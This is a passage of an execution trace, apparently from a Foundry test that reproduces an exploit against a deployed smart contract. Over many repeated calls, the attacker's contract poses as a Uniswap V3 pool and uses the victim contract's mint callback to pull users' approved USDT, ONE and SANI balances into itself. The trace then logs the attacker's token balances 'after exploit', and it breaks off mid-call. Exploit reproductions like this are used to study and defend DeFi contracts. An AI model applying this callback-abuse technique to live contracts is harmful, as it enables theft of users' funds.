    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000025f0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104010] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [29592] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0xbc1843A7dAa380D4e7412D829Adc85627c3f0eD9) [staticcall]
    │   │   │   └─ ← [Return] 901240190 [9.012e8]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 901240190 [9.012e8], 0x000000000000000000000000bc1843a7daa380d4e7412d829adc85627c3f0ed9)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0xbc1843A7dAa380D4e7412D829Adc85627c3f0eD9, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 901240190 [9.012e8])
    │   │   │   │   ├─ emit Transfer(from: 0xbc1843A7dAa380D4e7412D829Adc85627c3f0eD9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 901240190 [9.012e8])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002600000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104133] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [29715] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x853fd548dE9a1b8F94BcFF480DD9fEa6E0f20BB0) [staticcall]
    │   │   │   └─ ← [Return] 993000000 [9.93e8]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 993000000 [9.93e8], 0x000000000000000000000000853fd548de9a1b8f94bcff480dd9fea6e0f20bb0)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x853fd548dE9a1b8F94BcFF480DD9fEa6E0f20BB0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 993000000 [9.93e8])
    │   │   │   │   ├─ emit Transfer(from: 0x853fd548dE9a1b8F94BcFF480DD9fEa6E0f20BB0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 993000000 [9.93e8])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002610000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [122306] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [47888] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2553] ONE::balanceOf(0xF2cdD8b147802a07F862C9dc125190e0653795a2) [staticcall]
    │   │   │   └─ ← [Return] 271222002576657385674435501885 [2.712e29]
    │   │   ├─ [34906] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 271222002576657385674435501885 [2.712e29], 0x000000000000000000000000f2cdd8b147802a07f862c9dc125190e0653795a2)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] ONE: [0x73A83269b9bbAFC427E76Be0A2C1a1db2a26f4C2]
    │   │   │   ├─ [30126] ONE::transferFrom(0xF2cdD8b147802a07F862C9dc125190e0653795a2, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 271222002576657385674435501885 [2.712e29])
    │   │   │   │   ├─ emit Transfer(from: 0xF2cdD8b147802a07F862C9dc125190e0653795a2, to: 0x0000000000000000000000000000000000000000, value: 5424440051533147713488710037 [5.424e27])
    │   │   │   │   ├─ emit Transfer(from: 0xF2cdD8b147802a07F862C9dc125190e0653795a2, to: 0xd26Cc7C8D96F6Ca5291758d266447f6879A66E16, value: 5424440051533147713488710037 [5.424e27])
    │   │   │   │   ├─ emit Transfer(from: 0xF2cdD8b147802a07F862C9dc125190e0653795a2, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 260373122473591090247458081811 [2.603e29])
    │   │   │   │   ├─ emit transferWithTax(: 0xF2cdD8b147802a07F862C9dc125190e0653795a2, : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 271222002576657385674435501885 [2.712e29], : 5424440051533147713488710037 [5.424e27])
    │   │   │   │   ├─ emit Approval(owner: 0xF2cdD8b147802a07F862C9dc125190e0653795a2, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984665369342036880926622238694138050 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002620000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104379] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [29961] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x526FeE3a5EE9913019Fa943668F0A8712e6349A6) [staticcall]
    │   │   │   └─ ← [Return] 816830464 [8.168e8]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 816830464 [8.168e8], 0x000000000000000000000000526fee3a5ee9913019fa943668f0a8712e6349a6)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x526FeE3a5EE9913019Fa943668F0A8712e6349A6, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 816830464 [8.168e8])
    │   │   │   │   ├─ emit Transfer(from: 0x526FeE3a5EE9913019Fa943668F0A8712e6349A6, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 816830464 [8.168e8])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002630000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104502] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [30084] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0xe0643f2C33F5a7A97B25129F0552f2f1a45Fc4BA) [staticcall]
    │   │   │   └─ ← [Return] 679303994 [6.793e8]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 679303994 [6.793e8], 0x000000000000000000000000e0643f2c33f5a7a97b25129f0552f2f1a45fc4ba)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0xe0643f2C33F5a7A97B25129F0552f2f1a45Fc4BA, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 679303994 [6.793e8])
    │   │   │   │   ├─ emit Transfer(from: 0xe0643f2C33F5a7A97B25129F0552f2f1a45Fc4BA, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 679303994 [6.793e8])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002640000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [122675] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [48257] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2553] ONE::balanceOf(0x7e585B185fC67BC5f815B7Abf459300418Aa9f97) [staticcall]
    │   │   │   └─ ← [Return] 216913762662538105638689777931 [2.169e29]
    │   │   ├─ [34906] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 216913762662538105638689777931 [2.169e29], 0x0000000000000000000000007e585b185fc67bc5f815b7abf459300418aa9f97)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] ONE: [0x73A83269b9bbAFC427E76Be0A2C1a1db2a26f4C2]
    │   │   │   ├─ [30126] ONE::transferFrom(0x7e585B185fC67BC5f815B7Abf459300418Aa9f97, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 216913762662538105638689777931 [2.169e29])
    │   │   │   │   ├─ emit Transfer(from: 0x7e585B185fC67BC5f815B7Abf459300418Aa9f97, to: 0x0000000000000000000000000000000000000000, value: 4338275253250762112773795558 [4.338e27])
    │   │   │   │   ├─ emit Transfer(from: 0x7e585B185fC67BC5f815B7Abf459300418Aa9f97, to: 0xd26Cc7C8D96F6Ca5291758d266447f6879A66E16, value: 4338275253250762112773795558 [4.338e27])
    │   │   │   │   ├─ emit Transfer(from: 0x7e585B185fC67BC5f815B7Abf459300418Aa9f97, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 208237212156036581413142186815 [2.082e29])
    │   │   │   │   ├─ emit transferWithTax(: 0x7e585B185fC67BC5f815B7Abf459300418Aa9f97, : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 216913762662538105638689777931 [2.169e29], : 4338275253250762112773795558 [4.338e27])
    │   │   │   │   ├─ emit Approval(owner: 0x7e585B185fC67BC5f815B7Abf459300418Aa9f97, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984665423650276795045902274439862004 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002650000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [102254] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [27836] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2629] SANI::balanceOf(0x9EAaeaB7255296E68Ad1F12b969B9e30D1806c9d) [staticcall]
    │   │   │   └─ ← [Return] 160000000152043944202552349 [1.6e26]
    │   │   ├─ [14286] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 160000000152043944202552349 [1.6e26], 0x0000000000000000000000009eaaeab7255296e68ad1f12b969b9e30d1806c9d)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] SANI: [0x4521C9aD6A3D4230803aB752Ed238BE11F8B342F]
    │   │   │   ├─ [9506] SANI::transferFrom(0x9EAaeaB7255296E68Ad1F12b969B9e30D1806c9d, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 160000000152043944202552349 [1.6e26])
    │   │   │   │   ├─ emit Transfer(from: 0x9EAaeaB7255296E68Ad1F12b969B9e30D1806c9d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 160000000152043944202552349 [1.6e26])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002660000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104871] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [30453] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x5c7F06399ffD6707a8FCAF248661aBAbF160CD63) [staticcall]
    │   │   │   └─ ← [Return] 662408656 [6.624e8]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 662408656 [6.624e8], 0x0000000000000000000000005c7f06399ffd6707a8fcaf248661ababf160cd63)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x5c7F06399ffD6707a8FCAF248661aBAbF160CD63, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 662408656 [6.624e8])
    │   │   │   │   ├─ emit Transfer(from: 0x5c7F06399ffD6707a8FCAF248661aBAbF160CD63, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 662408656 [6.624e8])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002670000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104994] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [30576] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0xc0E3424A3B43bfd86a125a2C9704ce445fFc8bb8) [staticcall]
    │   │   │   └─ ← [Return] 505407723 [5.054e8]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 505407723 [5.054e8], 0x000000000000000000000000c0e3424a3b43bfd86a125a2c9704ce445ffc8bb8)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0xc0E3424A3B43bfd86a125a2C9704ce445fFc8bb8, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 505407723 [5.054e8])
    │   │   │   │   ├─ emit Transfer(from: 0xc0E3424A3B43bfd86a125a2C9704ce445fFc8bb8, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 505407723 [5.054e8])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002680000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104983] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [30565] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x3C0F97eBc34aD870414176e5e9126f31166eC1A9) [staticcall]
    │   │   │   └─ ← [Return] 580914463 [5.809e8]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 580914463 [5.809e8], 0x0000000000000000000000003c0f97ebc34ad870414176e5e9126f31166ec1a9)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x3C0F97eBc34aD870414176e5e9126f31166eC1A9, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 580914463 [5.809e8])
    │   │   │   │   ├─ emit Transfer(from: 0x3C0F97eBc34aD870414176e5e9126f31166eC1A9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 580914463 [5.809e8])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002690000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [1031] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 104995098497 [1.049e11]
    ├─ [2484] USDT::decimals() [staticcall]
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "Attacker USDT balance after exploit", val: 104995098497 [1.049e11], decimals: 6)
    ├─ [534] BONE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 20121200201296387979654 [2.012e22]
    ├─ [2403] BONE::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker BONE balance after exploit", val: 20121200201296387979654 [2.012e22], decimals: 18)
    ├─ [562] 0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 37656666000000000000000000 [3.765e25]
    ├─ [272] 0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker WOOF balance after exploit", val: 37656666000000000000000000 [3.765e25], decimals: 18)
    ├─ [958] LEASH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 43213205257076277282 [4.321e19]
    ├─ [2453] LEASH::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker LEASH balance after exploit", val: 43213205257076277282 [4.321e19], decimals: 18)
    ├─ [629] SANI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2460968380949404909854754588 [2.46e27]
    ├─ [200] SANI::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker SANI balance after exploit", val: 2460968380949404909854754588 [2.46e27], decimals: 18)
    ├─ [553] ONE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2481240198843183334367906100917 [2.481e30]
    ├─ [425] ONE::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker ONE balance after exploit", val: 2481240198843183334367906100917 [2.481e30], decimals: 18)
    ├─ [467] CELL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10966052921140276907322 [1.096e22]
    ├─ [2402] CELL::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker CELL balance after exploit", val: 10966052921140276907322 [1.096e22], decimals: 18)
    ├─ [1315] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 1900052720 [1.9e9]
    │   └─ ← [Return] 1900052720 [1.9e9]
    ├─ [3164] USDC::decimals() [staticcall]
